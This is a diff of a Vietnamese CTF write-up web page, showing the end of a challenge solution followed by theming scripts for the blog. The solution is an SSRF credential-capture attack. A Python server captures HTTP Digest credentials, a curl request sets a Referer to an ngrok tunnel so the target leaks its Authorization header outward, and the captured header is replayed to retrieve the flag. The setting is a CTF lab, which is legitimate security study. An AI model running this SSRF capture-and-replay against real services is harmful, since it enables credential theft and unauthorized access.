+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* Host localhost:5000 was resolved.
+</span></span><span class="line"><span class="cl">* IPv6: ::1
+</span></span><span class="line"><span class="cl">* IPv4: 127.0.0.1
+</span></span><span class="line"><span class="cl">*   Trying [::1]:5000...
+</span></span><span class="line"><span class="cl">* Connected to localhost (::1) port 5000
+</span></span><span class="line"><span class="cl">* using HTTP/1.x
+</span></span><span class="line"><span class="cl">&gt; GET /auth HTTP/1.1
+</span></span><span class="line"><span class="cl">&gt; Host: localhost:5000
+</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/8.15.0
+</span></span><span class="line"><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="cl">&gt; 
+</span></span><span class="line"><span class="cl">* Request completely sent off
+</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 401 UNAUTHORIZED
+</span></span><span class="line"><span class="cl">&lt; Server: Werkzeug/3.1.3 Python/3.12.12
+</span></span><span class="line"><span class="cl">&lt; Date: Thu, 13 Nov 2025 15:32:51 GMT
+</span></span><span class="line"><span class="cl">&lt; Content-Type: text/html; charset=utf-8
+</span></span><span class="line"><span class="cl">&lt; Content-Length: 19
+</span></span><span class="line"><span class="cl">&lt; WWW-Authenticate: Digest realm=&#34;Authentication Required&#34;,nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;,opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;,algorithm=&#34;MD5&#34;,qop=&#34;auth&#34;
+</span></span><span class="line"><span class="cl">&lt; Vary: Cookie
+</span></span><span class="line"><span class="cl">&lt; Set-Cookie: session=.eJwlyzsOwyAQBcC7bO0C8D5gc5kILw-58keKKyt3jyL3M7e067O-t31zykty7U7UlCy6IS_Ice6pMTBkkJDp8fvRzusfCujdVANGosWyqLNVDKgOK9Hk-wO1QRys.aRX6Iw.gvztvlOTt7zmkbCt-T4scvxsdVA; HttpOnly; Path=/
+</span></span><span class="line"><span class="cl">&lt; Connection: close
+</span></span><span class="line"><span class="cl">&lt; 
+</span></span><span class="line"><span class="cl">* shutting down connection #0
+</span></span><span class="line"><span class="cl">Unauthorized Access  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>Lấy từ response:
 <ul>
 <li><code>WWW-Authenticate: Digest realm=&quot;Authentication Required&quot;,nonce=&quot;68dce582291c956b5613d2ae0e065ee5&quot;,opaque=&quot;75ecd94405f2e917b4cea85f544f9719&quot;</code></li>
@@ -400,50 +652,109 @@ Unauthorized Access
 <hr>
 <p><strong>Chạy credential capture server cục bộ với nonce/opaque ở trên</strong>
 <code>capture.py</code></p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">import http.server
-import socketserver
-
-class CaptureHandler(http.server.BaseHTTPRequestHandler):
-    challenged = False
-
-    def do_GET(self):
-        if self.path != &#39;/auth&#39;:
-            self.send_response(404)
-            self.end_headers()
-            return
-
-        if &#39;Authorization&#39; not in self.headers and not self.challenged:
-            self.challenged = True
-            self.send_response(401)
-            nonce = &#34;your_nonce&#34;  # Thay thế
-            opaque = &#34;your_opaque&#34;  # Thay thế
-            self.send_header(&#39;WWW-Authenticate&#39;, f&#39;Digest realm=&#34;Authentication Required&#34;, qop=&#34;auth&#34;, nonce=&#34;{nonce}&#34;, opaque=&#34;{opaque}&#34;&#39;)
-            self.end_headers()
-        else:
-            auth_header = self.headers.get(&#39;Authorization&#39;, &#39;No auth header&#39;)
-            print(f&#34;Captured Authorization header: {auth_header}&#34;)
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(b&#34;OK - header captured&#34;)
-
-with socketserver.TCPServer((&#34;&#34;, 8000), CaptureHandler) as httpd:
-    print(&#34;Capture server running on http://localhost:8000&#34;)
-    httpd.serve_forever()
-</code></pre><p>rồi chạy <code>python3 capture.py</code>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import http.server
+</span></span><span class="line"><span class="cl">import socketserver
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class CaptureHandler(http.server.BaseHTTPRequestHandler):
+</span></span><span class="line"><span class="cl">    challenged = False
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    def do_GET(self):
+</span></span><span class="line"><span class="cl">        if self.path != &#39;/auth&#39;:
+</span></span><span class="line"><span class="cl">            self.send_response(404)
+</span></span><span class="line"><span class="cl">            self.end_headers()
+</span></span><span class="line"><span class="cl">            return
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        if &#39;Authorization&#39; not in self.headers and not self.challenged:
+</span></span><span class="line"><span class="cl">            self.challenged = True
+</span></span><span class="line"><span class="cl">            self.send_response(401)
+</span></span><span class="line"><span class="cl">            nonce = &#34;your_nonce&#34;  # Thay thế
+</span></span><span class="line"><span class="cl">            opaque = &#34;your_opaque&#34;  # Thay thế
+</span></span><span class="line"><span class="cl">            self.send_header(&#39;WWW-Authenticate&#39;, f&#39;Digest realm=&#34;Authentication Required&#34;, qop=&#34;auth&#34;, nonce=&#34;{nonce}&#34;, opaque=&#34;{opaque}&#34;&#39;)
+</span></span><span class="line"><span class="cl">            self.end_headers()
+</span></span><span class="line"><span class="cl">        else:
+</span></span><span class="line"><span class="cl">            auth_header = self.headers.get(&#39;Authorization&#39;, &#39;No auth header&#39;)
+</span></span><span class="line"><span class="cl">            print(f&#34;Captured Authorization header: {auth_header}&#34;)
+</span></span><span class="line"><span class="cl">            self.send_response(200)
+</span></span><span class="line"><span class="cl">            self.end_headers()
+</span></span><span class="line"><span class="cl">            self.wfile.write(b&#34;OK - header captured&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">with socketserver.TCPServer((&#34;&#34;, 8000), CaptureHandler) as httpd:
+</span></span><span class="line"><span class="cl">    print(&#34;Capture server running on http://localhost:8000&#34;)
+</span></span><span class="line"><span class="cl">    httpd.serve_forever()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>rồi chạy <code>python3 capture.py</code>
 <img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkWfsOQe-x.png"></p>
 <hr>
 <p><strong>SSRF để capture header</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;Referer: https://unconsecrative-interaxial-mirtha.ngrok-free.dev&#34;</span> http://localhost:5000/api/check
-</span></span></code></pre></div><p>=&gt; Trả về <code>{&quot;status&quot;:200}</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;Referer: https://unconsecrative-interaxial-mirtha.ngrok-free.dev&#34;</span> http://localhost:5000/api/check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>=&gt; Trả về <code>{&quot;status&quot;:200}</code></p>
 <p>Log trong capture.py: Captured Authorization header: Digest &hellip; (copy chuỗi đầy đủ sau &ldquo;Digest &ldquo;).</p>
-<pre tabindex="0"><code class="language-bash!" data-lang="bash!">Capture server running on http://localhost:8000
-127.0.0.1 - - [13/Nov/2025 10:47:32] &#34;GET /auth HTTP/1.1&#34; 401 -
-Captured Authorization header: Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;, uri=&#34;/auth&#34;, response=&#34;dc663a15c2d779051366cad3184716d6&#34;, opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;, qop=&#34;auth&#34;, nc=00000001, cnonce=&#34;9fe57f06b5ccf275&#34;
-127.0.0.1 - - [13/Nov/2025 10:47:33] &#34;GET /auth HTTP/1.1&#34; 200 -
-</code></pre><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Capture server running on http://localhost:8000
+</span></span><span class="line"><span class="cl">127.0.0.1 - - [13/Nov/2025 10:47:32] &#34;GET /auth HTTP/1.1&#34; 401 -
+</span></span><span class="line"><span class="cl">Captured Authorization header: Digest username=&#34;keno&#34;, realm=&#34;Authentication Required&#34;, nonce=&#34;68dce582291c956b5613d2ae0e065ee5&#34;, uri=&#34;/auth&#34;, response=&#34;dc663a15c2d779051366cad3184716d6&#34;, opaque=&#34;75ecd94405f2e917b4cea85f544f9719&#34;, qop=&#34;auth&#34;, nc=00000001, cnonce=&#34;9fe57f06b5ccf275&#34;
+</span></span><span class="line"><span class="cl">127.0.0.1 - - [13/Nov/2025 10:47:33] &#34;GET /auth HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <p><strong>Replay header với session để lấy flag</strong></p>
-<pre tabindex="0"><code class="language-bash!" data-lang="bash!">curl -v -H &#39;Authorization: Digest &lt;captured_digest_string&gt;&#39; -H &#34;Cookie: session=&lt;session_above&gt;&#34; http://localhost:5000/auth
-</code></pre><p>Response (200 OK): <code>auth.html</code> với script chứa const gg = &ldquo;bctf{fake_flag_for_testing}&rdquo;;.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl -v -H &#39;Authorization: Digest &lt;captured_digest_string&gt;&#39; -H &#34;Cookie: session=&lt;session_above&gt;&#34; http://localhost:5000/auth
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Response (200 OK): <code>auth.html</code> với script chứa const gg = &ldquo;bctf{fake_flag_for_testing}&rdquo;;.</p>
 <p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HJc0pdmlbx.png"></p>
 <hr>
 <p><strong>FLAG: bctf{a_new_dog_learns_old_tricks}</strong></p>
@@ -471,442 +782,355 @@ Captured Authorization header: Digest username=&#34;keno&#34;, realm=&#34;Authen
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
         <path d="M12 6H0l6-6z" />
     </svg>
-</a><canvas id="matrix-bg"></canvas>
+</a><div id="three-container" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -9999; background: #000;"></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+    let scene, camera, renderer, networkGroup;
+    let mouseX = 0, mouseY = 0;
+    const container = document.getElementById('three-container');
+    const windowHalfX = window.innerWidth / 2;
+    const windowHalfY = window.innerHeight / 2;
+
+    function initThreeJS() {
+        if (!container) return;
+        scene = new THREE.Scene();
+        scene.fog = new THREE.FogExp2(0x000000, 0.0015);
+        camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 1, 2000);
+        camera.position.z = 1000;
+        renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+        renderer.setPixelRatio(window.devicePixelRatio);
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setClearColor(0x000000, 1);
+        container.innerHTML = ''; 
+        container.appendChild(renderer.domElement);
+        networkGroup = new THREE.Group();
+        scene.add(networkGroup);
+        
+        const geometry = new THREE.BoxGeometry(40, 40, 40);
+        const material = new THREE.MeshBasicMaterial({ color: 0x00ff41, wireframe: true, transparent: true, opacity: 0.5, side: THREE.DoubleSide });
+        
+        for (let i = 0; i < 200; i++) {
+            const mesh = new THREE.Mesh(geometry, material);
+            mesh.position.x = (Math.random() - 0.5) * 2000;
+            mesh.position.y = (Math.random() - 0.5) * 2000;
+            mesh.position.z = (Math.random() - 0.5) * 2000;
+            mesh.rotation.x = Math.random() * 2 * Math.PI;
+            mesh.rotation.y = Math.random() * 2 * Math.PI;
+            mesh.scale.set(Math.random() * 2 + 0.5, Math.random() * 2 + 0.5, Math.random() * 2 + 0.5);
+            networkGroup.add(mesh);
+        }
+
+        const lineMaterial = new THREE.LineBasicMaterial({ color: 0x00ff41, transparent: true, opacity: 0.2 });
+        const lineGeometry = new THREE.BufferGeometry();
+        const positions = [];
+        const blocks = networkGroup.children;
+
+        for (let i = 0; i < blocks.length; i++) {
+            for (let j = i + 1; j < blocks.length; j++) {
+                const dist = blocks[i].position.distanceTo(blocks[j].position);
+                if (dist < 300) {
+                    positions.push(blocks[i].position.x, blocks[i].position.y, blocks[i].position.z);
+                    positions.push(blocks[j].position.x, blocks[j].position.y, blocks[j].position.z);
+                }
+            }
+        }
+        lineGeometry.setAttribute('position', new THREE.Float32BufferAttribute(positions, 3));
+        const lines = new THREE.LineSegments(lineGeometry, lineMaterial);
+        networkGroup.add(lines);
+
+        document.addEventListener('mousemove', onDocumentMouseMove, false);
+        window.addEventListener('resize', onWindowResize, false);
+    }
+
+    function onWindowResize() { camera.aspect = window.innerWidth / window.innerHeight; camera.updateProjectionMatrix(); renderer.setSize(window.innerWidth, window.innerHeight); }
+    function onDocumentMouseMove(event) { mouseX = (event.clientX - windowHalfX) * 0.5; mouseY = (event.clientY - windowHalfY) * 0.5; }
+    function animateThreeJS() { requestAnimationFrame(animateThreeJS); render(); }
+    function render() {
+        const time = Date.now() * 0.0005;
+        camera.position.x += (mouseX - camera.position.x) * 0.05;
+        camera.position.y += (-mouseY - camera.position.y) * 0.05;
+        camera.lookAt(scene.position);
+        networkGroup.rotation.x = time * 0.2;
+        networkGroup.rotation.y = time * 0.3;
+        renderer.render(scene, camera);
+    }
+    
+    if(!window.threeInitialized) { initThreeJS(); animateThreeJS(); window.threeInitialized = true; }
+</script>
+
+
+<div id="cyber-back-btn" style="display: none;" onclick="goBack()">
+    <span class="cmd">&lt;</span> <span class="text">RETURN</span>
+</div>
+
+<div id="hackmd-toc-wrapper" style="display: none;">
+    <div class="toc-header">:: TABLE OF CONTENTS ::</div>
+    <div id="hackmd-toc-content"></div>
+</div>
+
+<script>
+    
+    function goBack() {
+        
+        if (window.history.length > 1 && document.referrer.indexOf(window.location.host) !== -1) {
+            window.history.back();
+        } else {
+            window.location.href = '/'; 
+        }
+    }
+
+    
+    function generateHackMDTOC() {
+        const tocWrapper = document.getElementById('hackmd-toc-wrapper');
+        const tocContent = document.getElementById('hackmd-toc-content');
+        const backBtn = document.getElementById('cyber-back-btn');
+        const postContent = document.querySelector('.post-content');
+
+        
+        if(tocContent) tocContent.innerHTML = '';
+        if(tocWrapper) tocWrapper.style.display = 'none';
+        if(backBtn) backBtn.style.display = 'none';
+
+        
+        if (postContent && tocContent) {
+            
+            if(backBtn) backBtn.style.display = 'block';
+
+            
+            const headings = postContent.querySelectorAll('h1, h2, h3, h4');
+            if (headings.length > 0) {
+                tocWrapper.style.display = 'block';
+                const ul = document.createElement('ul');
+
+                headings.forEach((heading) => {
+                    let id = heading.getAttribute('id');
+                    if (!id) {
+                        id = heading.innerText.toLowerCase().replace(/[^\w]+/g, '-');
+                        heading.setAttribute('id', id);
+                    }
+
+                    const li = document.createElement('li');
+                    const level = heading.tagName.toLowerCase();
+                    li.className = `toc-item ${level}`;
+
+                    const a = document.createElement('a');
+                    a.href = `#${id}`;
+                    a.innerText = heading.innerText;
+                    a.className = 'toc-link';
+                    
+                    a.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        const target = document.getElementById(id);
+                        if(target) {
+                            const offsetPosition = target.getBoundingClientRect().top + window.pageYOffset - 100;
+                            window.scrollTo({ top: offsetPosition, behavior: "smooth" });
+                            history.pushState(null, null, `#${id}`);
+                        }
+                    });
+
+                    li.appendChild(a);
+                    ul.appendChild(li);
+                });
+                tocContent.appendChild(ul);
+
+                
+                const observer = new IntersectionObserver(entries => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            const id = entry.target.getAttribute('id');
+                            document.querySelectorAll('.toc-link').forEach(link => link.classList.remove('active'));
+                            const activeLink = document.querySelector(`.toc-link[href="#${id}"]`);
+                            if (activeLink) {
+                                activeLink.classList.add('active');
+                                activeLink.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+                            }
+                        }
+                    });
+                }, { rootMargin: '-100px 0px -70% 0px' });
+                headings.forEach(heading => observer.observe(heading));
+            }
+        }
+    }
+</script>
+
 <style>
      
-    #matrix-bg {
+    #cyber-back-btn {
         position: fixed;
-        top: 0; left: 0;
-        width: 100vw; height: 100vh;
-        z-index: -9999;  
-        pointer-events: none;
+        left: 20px;
+        top: 130px;  
+        width: 260px;  
+        padding: 10px 15px;
+        box-sizing: border-box;
+        
+        background: rgba(0, 0, 0, 0.8);
+        border: 1px solid #00ff41;
+        border-left: 5px solid #00ff41;  
+        color: #00ff41;
+        
+        font-family: 'Courier New', monospace;
+        font-weight: bold;
+        font-size: 14px;
+        cursor: pointer;
+        z-index: 95;
+        transition: all 0.3s ease;
+        backdrop-filter: blur(5px);
+        
+        text-transform: uppercase;
+        letter-spacing: 1px;
     }
+
+    #cyber-back-btn:hover {
+        background: rgba(0, 255, 65, 0.2);
+        box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
+        padding-left: 25px;  
+    }
+    
+    #cyber-back-btn .cmd { opacity: 0.7; margin-right: 5px; }
 
      
-    .emoji-reset {
-        font-family: "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji", "Android Emoji", sans-serif !important;
-        color: initial !important; 
-        background: none !important; 
-        -webkit-text-fill-color: initial !important; 
-        -webkit-background-clip: border-box !important;
-        text-shadow: none !important; 
-        font-style: normal !important;
-        display: inline-block !important;
-        font-weight: normal !important;
+    #hackmd-toc-wrapper {
+        position: fixed;
+        left: 20px;
+        top: 180px;  
+        width: 260px;
+        max-height: calc(100vh - 200px);
+        overflow-y: auto;
+        z-index: 90;
+        background: transparent;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+        padding-right: 10px;
+    }
+
+    .toc-header {
+        font-family: 'Courier New', monospace;
+        font-size: 11px; font-weight: bold; color: #00ff41;
+        margin-bottom: 15px; border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        padding-bottom: 5px; opacity: 0.8;
+    }
+    #hackmd-toc-content ul { list-style: none; padding: 0; margin: 0; border-left: 2px solid rgba(255, 255, 255, 0.1); }
+    #hackmd-toc-content li { margin: 0; position: relative; }
+    .toc-link { display: block; text-decoration: none; color: #888; font-size: 13px; padding: 5px 0 5px 15px; line-height: 1.5; transition: all 0.2s ease; border-left: 2px solid transparent; margin-left: -2px; }
+    .toc-link:hover { color: #fff; }
+    .toc-link.active { color: #00ff41 !important; font-weight: 500; border-left: 2px solid #00ff41; background: linear-gradient(90deg, rgba(0, 255, 65, 0.05), transparent); }
+    .toc-item.h1 { padding-left: 0; } .toc-item.h1 .toc-link { font-weight: bold; font-size: 14px; color: #ccc; }
+    .toc-item.h2 { padding-left: 0; }
+    .toc-item.h3 .toc-link { padding-left: 30px; font-size: 12px; }
+    .toc-item.h4 .toc-link { padding-left: 45px; font-size: 11px; opacity: 0.8; }
+    #hackmd-toc-wrapper::-webkit-scrollbar { width: 3px; }
+    #hackmd-toc-wrapper::-webkit-scrollbar-thumb { background: #333; }
+
+     
+    @media screen and (max-width: 1450px) {
+        #hackmd-toc-wrapper, #cyber-back-btn { display: none !important; }
     }
 </style>
-<script>
-    
-    const canvas = document.getElementById('matrix-bg');
-    const ctx = canvas.getContext('2d');
 
-    function resizeCanvas() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
+
+<style>
+    .post-single {
+        background-color: rgba(0, 0, 0, 0.85) !important;
+        backdrop-filter: blur(10px);
+        border: 1px solid #00ff41;
+        border-radius: 12px;
+        padding: 40px;
+        margin-top: 20px;
+        box-shadow: 0 0 30px rgba(0, 255, 65, 0.15);
+        position: relative;
+        z-index: 1;
     }
-    window.addEventListener('resize', resizeCanvas);
-    resizeCanvas();
-
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
-    const fontSize = 14;
-    const columns = Math.ceil(window.innerWidth / fontSize);
-    const drops = Array(columns).fill(1);
-
-    function draw() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = 'rgba(0, 255, 65, 0.15)'; 
-        ctx.font = fontSize + 'px monospace';
-
-        for (let i = 0; i < drops.length; i++) {
-            const text = chars.charAt(Math.floor(Math.random() * chars.length));
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                drops[i] = 0;
-            }
-            drops[i]++;
+    @media screen and (min-width: 1451px) {
+        .post-single {
+            margin-left: 300px !important;
+            width: calc(100% - 300px) !important;
+            max-width: 1000px;
         }
+        .main { max-width: 1600px !important; margin: auto; }
     }
-    
-    ctx.fillStyle = '#000000';
-    ctx.fillRect(0, 0, canvas.width, canvas.height);
-    setInterval(draw, 35);
-
-    
-    document.addEventListener("DOMContentLoaded", function() {
-        function rescueEmojis(node) {
-            if (node.nodeType === 3) { 
-                const text = node.nodeValue;
-                const emojiRegex = /[\p{Emoji_Presentation}\p{Extended_Pictographic}\u{1F300}-\u{1F6FF}\u{1F900}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/gu;
-                if (text.match(emojiRegex)) {
-                    const span = document.createElement('span');
-                    span.innerHTML = text.replace(emojiRegex, '<span class="emoji-reset">$&</span>');
-                    node.parentNode.replaceChild(span, node);
-                }
-            } 
-            else if (node.nodeType === 1 && !['SCRIPT', 'STYLE', 'TEXTAREA', 'CODE', 'PRE'].includes(node.tagName) && !node.classList.contains('emoji-reset')) {
-                Array.from(node.childNodes).forEach(child => rescueEmojis(child));
-            }
-        }
-        rescueEmojis(document.body);
-    });
-</script>
+    .post-content { color: #e0e0e0; }
+    .post-content pre { border: 1px solid rgba(0, 255, 65, 0.4); background: #0d1117 !important; }
+</style>
 
 
-<canvas id="fireworks" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:99999;"></canvas>
 <script>
-    
-    (function() {
-        if(!window.anime) {
-            var script = document.createElement('script');
-            script.src = "https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js";
-            script.onload = initFireworks;
-            document.head.appendChild(script);
-        } else { initFireworks(); }
-    })();
-
-    function initFireworks() {
-        const fireworkCanvas = document.getElementById('fireworks');
-        const fwCtx = fireworkCanvas.getContext('2d');
-        let fwWidth = window.innerWidth;
-        let fwHeight = window.innerHeight;
-        fireworkCanvas.width = fwWidth;
-        fireworkCanvas.height = fwHeight;
-
-        window.addEventListener('resize', () => {
-            fwWidth = window.innerWidth;
-            fwHeight = window.innerHeight;
-            fireworkCanvas.width = fwWidth;
-            fireworkCanvas.height = fwHeight;
-        });
-
-        function createParticle(x, y) {
-            const particle = {};
-            particle.x = x;
-            particle.y = y;
-            const colors = ['#00ff41', '#008F11', '#ffffff'];
-            particle.color = colors[Math.floor(Math.random() * colors.length)];
-            particle.radius = Math.random() * 2 + 1;
-            const angle = Math.random() * Math.PI * 2;
-            const velocity = Math.random() * 6 + 2;
-            particle.vx = Math.cos(angle) * velocity;
-            particle.vy = Math.sin(angle) * velocity;
-            particle.life = 100; 
-            return particle;
-        }
-
-        let particles = [];
-
-        function animateFireworks() {
-            requestAnimationFrame(animateFireworks);
-            fwCtx.clearRect(0, 0, fwWidth, fwHeight);
-            for (let i = 0; i < particles.length; i++) {
-                const p = particles[i];
-                fwCtx.beginPath();
-                fwCtx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
-                fwCtx.fillStyle = p.color;
-                fwCtx.globalAlpha = p.life / 100;
-                fwCtx.fill();
-                fwCtx.globalAlpha = 1;
-                p.x += p.vx;
-                p.y += p.vy;
-                p.life--;
-                if (p.life <= 0) {
-                    particles.splice(i, 1);
-                    i--;
-                }
+    function initStatusBar() {
+        if (document.getElementById('system-status-bar')) return;
+        const header = document.querySelector('.header') || document.querySelector('header');
+        if (header) {
+            const statusBar = document.createElement('div');
+            statusBar.id = 'system-status-bar';
+            statusBar.innerHTML = `
+                <div class="status-content">
+                    <div class="status-item"><span class="label">SYSTEM:</span> <span class="value">ONLINE</span></div>
+                    <div class="status-clock"><span id="sb-hour">00</span><span class="blink">:</span><span id="sb-min">00</span><span class="blink">:</span><span id="sb-sec">00</span></div>
+                    <div class="status-item"><span class="label">DATE:</span> <span class="value" id="sb-date">LOADING...</span></div>
+                </div>`;
+            header.parentNode.insertBefore(statusBar, header.nextSibling);
+            function updateTime() {
+                const now = new Date();
+                const hEl = document.getElementById('sb-hour'), mEl = document.getElementById('sb-min'), sEl = document.getElementById('sb-sec'), dEl = document.getElementById('sb-date');
+                if(hEl) { hEl.innerText = String(now.getHours()).padStart(2, '0'); mEl.innerText = String(now.getMinutes()).padStart(2, '0'); sEl.innerText = String(now.getSeconds()).padStart(2, '0'); }
+                if(dEl) { dEl.innerText = now.toLocaleDateString('en-CA'); }
             }
+            setInterval(updateTime, 1000); updateTime();
         }
-        animateFireworks();
-
-        document.addEventListener('mousedown', (e) => {
-            if(e.button === 0) { 
-                for (let i = 0; i < 30; i++) {
-                    particles.push(createParticle(e.clientX, e.clientY));
-                }
-            }
-        });
     }
 </script>
+<style>
+    #system-status-bar { width: 100%; background-color: rgba(0, 10, 0, 0.85); border-bottom: 1px solid #00ff41; border-top: 1px solid rgba(0, 255, 65, 0.2); padding: 10px 0; margin-bottom: 30px; font-family: 'Courier New', monospace; backdrop-filter: blur(5px); position: relative; z-index: 99; }
+    .status-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
+    .status-item { font-size: 0.9rem; color: #00ff41; opacity: 0.8; } .status-item .label { font-weight: bold; color: #fff; }
+    .status-clock { font-size: 1.8rem; font-weight: 800; color: #00ff41; text-shadow: 0 0 15px rgba(0, 255, 65, 0.6); letter-spacing: 3px; background: rgba(0, 255, 65, 0.05); padding: 5px 20px; border-radius: 5px; border: 1px dashed rgba(0, 255, 65, 0.3); }
+    .blink { animation: blink-anim 1s infinite; } @keyframes blink-anim { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+    @media screen and (max-width: 768px) { .status-content { flex-direction: column; gap: 5px; } .status-clock { font-size: 1.4rem; width: 100%; text-align: center; box-sizing: border-box; } }
+</style>
 
+
+<style>
+    .profile img { border-radius: 50% !important; border: 3px solid #00ff41 !important; box-shadow: 0 0 25px rgba(0, 255, 65, 0.4) !important; background: #000; transition: transform 0.3s ease; }
+    .profile img:hover { transform: scale(1.05) rotate(5deg); box-shadow: 0 0 50px rgba(0, 255, 65, 0.9) !important; }
+    .art-widget, .cyber-panel, .avatar-wrapper-hud { display: none !important; }
+</style>
 
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.js"></script>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 <script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
-
-<div id="aplayer-fixed" class="hacker-player"></div>
+<div id="aplayer-fixed"></div>
 
 <script>
-    document.addEventListener('DOMContentLoaded', () => {
-        
-        var pjax = new Pjax({
-            selectors: [
-                "title", 
-                "meta[name=description]", 
-                "main", 
-            ],
-            cacheBust: false
-        });
+    function initAllWidgets() {
+        initStatusBar();
+        generateHackMDTOC();
+    }
 
-        
+    document.addEventListener('DOMContentLoaded', () => {
+        var pjax = new Pjax({ selectors: ["title", "meta[name=description]", "main"], cacheBust: false });
         if (!window.ap) {
